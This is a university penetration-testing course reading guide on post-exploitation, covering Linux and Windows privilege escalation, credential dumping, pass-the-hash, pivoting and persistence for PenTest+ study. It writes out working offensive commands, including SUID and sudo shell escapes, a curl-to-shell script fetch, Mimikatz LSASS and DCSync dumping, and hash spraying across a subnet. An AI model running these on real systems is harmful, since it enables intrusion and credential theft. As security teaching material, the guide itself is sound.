# Reading Guide: Module 08 — Post-Exploitation and Lateral Movement

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Introduction

Module 08 covers post-exploitation — the activities that follow initial system compromise and demonstrate the true depth of risk. Privilege escalation, credential dumping, lateral movement, and persistence are the techniques that separate a shallow proof-of-concept exploit from a full impact demonstration.

This module maps to PT0-002 Domain 3: Attacks and Exploits (30% of exam) and Domain 4: Reporting and Communication (18% of exam), as post-exploitation findings are the most compelling evidence in a penetration test report.

**Legal and Ethical Reminder:** Post-exploitation activities carry significant potential for disruption. Credential dumping, privilege escalation, and persistence mechanisms must only occur within authorized scope against dedicated test systems. All persistence mechanisms installed during a test must be documented and removed before engagement closure. Never leave backdoors in client environments.

---

## 1. Linux Privilege Escalation Reference

### Enumeration First

Before attempting exploitation, enumerate the system thoroughly:

```bash
# System information
uname -a
cat /etc/os-release
hostname
id
whoami
groups

# Network information
ip addr
netstat -tulpn
cat /etc/hosts

# User and environment
cat /etc/passwd
cat /etc/group
env
echo $PATH
history

# Interesting files
ls -la /home/
ls -la /root/ 2>/dev/null
find / -name "*.txt" -readable 2>/dev/null | grep -i "pass\|cred\|secret"
```

### Privilege Escalation Vectors

| Vector | Check Command | Exploitation Path |
|--------|--------------|------------------|
| SUID binaries | `find / -perm -4000 2>/dev/null` | GTFOBins lookup |
| SGID binaries | `find / -perm -2000 2>/dev/null` | GTFOBins lookup |
| Sudo rights | `sudo -l` | Abusable commands |
| Writable cron | `ls -la /etc/cron*` | Inject reverse shell |
| World-writable service | `find / -writable -type f 2>/dev/null` | Replace binary |
| Capabilities | `getcap -r / 2>/dev/null` | Dangerous capabilities |
| Docker group | `id \| grep docker` | Container escape |
| Kernel exploit | `uname -r` | searchsploit |

### SUID Exploitation Examples

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# If /usr/bin/find has SUID set (from GTFOBins)
/usr/bin/find . -exec /bin/sh -p \; -quit

# If /usr/bin/python has SUID set
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If /bin/bash has SUID set (old technique)
/bin/bash -p
```

### Sudo Exploitation Examples

```bash
# Check what the current user can run as root
sudo -l

# If sudo allows /usr/bin/less
sudo less /etc/hosts
# Inside less: !/bin/sh

# If sudo allows /usr/bin/vim
sudo vim -c ':!/bin/sh'

# If sudo allows /usr/bin/python
sudo python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### Automated Enumeration Tools

```bash
# LinPEAS — comprehensive Linux privilege escalation checker
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum — older but reliable Linux enumeration script
./LinEnum.sh

# linux-smart-enumeration
./lse.sh -l 1
```

---

## 2. Windows Privilege Escalation Reference

### Initial Enumeration

```powershell
# System information
systeminfo
hostname
whoami /all
whoami /groups
whoami /priv

# User and group information
net user
net localgroup administrators
net localgroup

# Running processes and services
tasklist
sc query
Get-Service | Where-Object {$_.Status -eq "Running"}

# Installed software
wmic product get name,version
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
```

### Windows Privilege Escalation Vectors

| Vector | Detection Method | Impact |
|--------|-----------------|--------|
| Unquoted service paths | `wmic service get pathname` | SYSTEM |
| Weak service permissions | `accesschk.exe` | SYSTEM |
| AlwaysInstallElevated | `reg query` for both hives | SYSTEM |
| Token impersonation | `whoami /priv` for SeImpersonate | SYSTEM |
| DLL hijacking | Service/app DLL search order | Variable |
| Stored credentials | `cmdkey /list`, Credential Manager | User-level |

### Unquoted Service Path

```powershell
# Find unquoted paths with spaces
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """"

# Example vulnerable path:
# C:\Program Files\Vulnerable App\service.exe
# Windows will try: C:\Program.exe, C:\Program Files\Vulnerable.exe
# Place malicious binary at one of these locations
```

### Token Impersonation (Juicy Potato / PrintSpoofer)

If the current user has `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:

```powershell
# Check privileges
whoami /priv

# PrintSpoofer (modern Windows)
.\PrintSpoofer64.exe -i -c powershell.exe

# JuicyPotato (older Windows)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
```

### Automated Windows Privilege Escalation Tools

```powershell
# WinPEAS — comprehensive Windows checker
.\winPEASany.exe

# PowerUp — PowerShell privilege escalation checker
. .\PowerUp.ps1
Invoke-AllChecks

# Sherlock — deprecated but still referenced in courses
. .\Sherlock.ps1
Find-AllVulns
```

---

## 3. Credential Dumping Reference

### Windows Credential Storage Locations

| Location | Contents | Access Required |
|----------|---------|----------------|
| SAM database | Local account NTLM hashes | SYSTEM |
| LSASS memory | Logged-in user creds, Kerberos tickets, NTLM hashes | SYSTEM/Admin |
| NTDS.DIT | All AD domain account hashes | Domain Admin / DCSync rights |
| Credential Manager | Stored web/network credentials | Current user context |
| LSA Secrets (registry) | Service account passwords, cached creds | SYSTEM |

### Meterpreter Credential Collection

```text
# Dump SAM hashes (requires SYSTEM)
meterpreter > hashdump

# Load Kiwi extension (Mimikatz in Meterpreter)
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Post module for credential collection
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/windows/gather/hashdump
```

### Mimikatz Concepts (Conceptual — Authorized Environments Only)

```text
# Dump credentials from LSASS memory (requires SYSTEM or Admin + SeDebugPrivilege)
sekurlsa::logonpasswords

# Dump SAM database
lsadump::sam

# DCSync attack — request DC to "replicate" password hashes
# (requires replication rights, typically Domain Admin or delegated)
lsadump::dcsync /domain:corp.local /user:Administrator

# Pass-the-hash using captured hash
sekurlsa::pth /user:Administrator /domain:. /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
```

---

## 4. Pass-the-Hash and Lateral Movement

### Pass-the-Hash (PtH) Reference

PtH authenticates using the NTLM hash without knowing the plaintext password. Works against SMB, WMI, PsExec, and other NTLM-authenticated services.

```bash
# Metasploit PsExec with hash
msf6 > use exploit/windows/smb/psexec
# Set SMBPass as LM_HASH:NTLM_HASH format
set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE

# Impacket psexec
impacket-psexec DOMAIN/Administrator@TARGET_IP -hashes LM_HASH:NTLM_HASH

# Impacket wmiexec (WMI-based — noisier but valid)
impacket-wmiexec DOMAIN/Administrator@TARGET_IP -hashes LM_HASH:NTLM_HASH

# CrackMapExec — spray hash across subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth
```

### Lateral Movement Techniques

| Technique | Protocol | Tool | Requirement |
|-----------|----------|------|-------------|
| Pass-the-Hash | SMB/NTLM | psexec, impacket | NTLM hash |
| Pass-the-Ticket | Kerberos | Rubeus, Mimikatz | Kerberos ticket (.kirbi) |
| RDP | TCP/3389 | xfreerdp, rdesktop | Password or hash |
| WMI Exec | WMI | wmiexec, crackmapexec | Credentials or hash |
| PowerShell Remoting | WinRM/5985 | evil-winrm | Credentials or hash |
| SSH | TCP/22 | ssh | Private key or password |

---

## 5. Pivoting Reference

### Metasploit Autoroute and SOCKS Proxy

```text
# In Meterpreter session on pivot host
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

# Set up SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j

# Configure proxychains (/etc/proxychains4.conf)
# Add: socks5 127.0.0.1 1080

# Use proxychains to route tools through pivot
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.20
proxychains crackmapexec smb 10.10.10.0/24
```

### SSH Tunneling

```bash
# Local port forward (access 10.10.10.80:80 as localhost:8080)
ssh -L 8080:10.10.10.80:80 pivot_user@PIVOT_IP

# Remote port forward (expose attacker port to internal network)
ssh -R 4444:127.0.0.1:4444 pivot_user@PIVOT_IP

# Dynamic SOCKS proxy
ssh -D 1080 -N pivot_user@PIVOT_IP
```

---

## 6. Persistence Mechanisms Reference

### Windows Persistence

| Method | Location | Persistence Trigger |
|--------|---------|---------------------|
| Registry Run Key (HKCU) | `HKCU\...\CurrentVersion\Run` | User login |
| Registry Run Key (HKLM) | `HKLM\...\CurrentVersion\Run` | Any user login |
| Scheduled Task | Task Scheduler | Time or event trigger |
| Service | Services (sc.exe) | System boot |
| Startup Folder | `%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` | User login |
| DLL Hijacking | Application DLL path | Application execution |

### Linux Persistence

| Method | Location | Persistence Trigger |
|--------|---------|---------------------|
| Cron job | `/etc/crontab`, `/var/spool/cron/` | Time-based |
| SSH authorized key | `~/.ssh/authorized_keys` | SSH login |
| `.bashrc`/`.profile` | User home directory | Shell spawn |
| Systemd service | `/etc/systemd/system/` | System boot |
| SUID backdoor | Any writable path | On execution |
| `/etc/rc.local` | System init | System boot |

**Engagement Obligation:** All persistence mechanisms must be recorded in the penetration test log and removed before the engagement closes. Failure to remove persistence is a reportable incident.

---

## 7. MITRE ATT&CK Mapping

Post-exploitation techniques map to these ATT&CK tactics:

| ATT&CK Tactic | Module 08 Techniques |
|--------------|----------------------|
| TA0004 Privilege Escalation | SUID abuse, sudo misconfig, token impersonation |
| TA0006 Credential Access | LSASS dumping, SAM dump, DCSync |
| TA0008 Lateral Movement | Pass-the-Hash, PsExec, WMI exec, RDP |
| TA0003 Persistence | Registry run keys, scheduled tasks, cron jobs |
| TA0005 Defense Evasion | Living off the land, AMSI bypass |
| TA0007 Discovery | Local enumeration, network discovery |

---

## 8. PenTest+ Exam Tips

- **Privilege escalation paths**: Know at least two Linux and two Windows vectors. SUID and sudo are the most commonly tested Linux vectors. Unquoted service paths and weak service permissions are most tested for Windows.

- **Credential dumping locations**: SAM = local hashes = SYSTEM required. LSASS = in-memory creds. NTDS.DIT = domain hashes on DC.

- **Pass-the-hash**: NTLM hash is used directly — no password needed. Works on SMB, WMI, PsExec-style tools. Does NOT work natively with Kerberos.

- **Pivoting terminology**: Know autoroute (Metasploit), proxychains (proxy routing), and port forwarding.

- **Persistence removal**: The exam tests that persistence must be removed at engagement close. This is both a technical and professional requirement.

- **Living off the land**: The exam tests that LotL techniques use native OS binaries (certutil, PowerShell, wmic) to avoid malware detection.

- **MITRE ATT&CK**: The exam references ATT&CK tactic and technique numbers. Know the post-exploitation tactic names.

---

## 9. Study Checklist

- [ ] Identify three Linux privilege escalation vectors and describe how to exploit each
- [ ] Identify three Windows privilege escalation vectors and describe detection commands
- [ ] Explain what credential dumping reveals and the access level required for each source
- [ ] Describe pass-the-hash and why it works without knowing the plaintext password
- [ ] Explain Metasploit autoroute and proxychains and how they enable pivoting
- [ ] List four persistence mechanisms (two Windows, two Linux) with their trigger conditions
- [ ] Identify three living-off-the-land techniques on Windows and explain their defensive evasion value
- [ ] Complete the Module 08 lab and submit deliverables
- [ ] Review PT0-002 Domain 3 post-exploitation objectives prior to quiz

---

---

## 10. Supplemental Resources

**1. GTFOBins — Linux Privilege Escalation via Misconfigured Binaries**
[https://gtfobins.github.io/](https://gtfobins.github.io/)
GTFOBins documents Unix binaries that can be exploited by an attacker with limited privileges to bypass local security restrictions. The site is organized by binary name and shows SUID, sudo, and file read/write exploitation techniques. It is the essential reference for the Linux privilege escalation techniques covered in Module 08 and is regularly tested on PT0-002.

**2. LOLBAS — Living Off the Land Binaries and Scripts (Windows)**
[https://lolbas-project.github.io/](https://lolbas-project.github.io/)
The LOLBAS project catalogs Windows binaries, scripts, and libraries that can be used by attackers for execution, download, and evasion — the Windows equivalent of GTFOBins. It is directly applicable to the living-off-the-land post-exploitation techniques in Module 08 and the PT0-002 defense evasion exam objectives.

**3. TryHackMe — Linux and Windows Privilege Escalation Rooms**
[https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)
TryHackMe's privilege escalation rooms provide guided hands-on practice with SUID abuse, sudo misconfigurations, writable paths, cron job exploitation, and Windows token impersonation against dedicated vulnerable machines. Completing these rooms reinforces all Module 08 lab exercises and builds proficiency with the tools and techniques required for PT0-002 Domain 3.

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
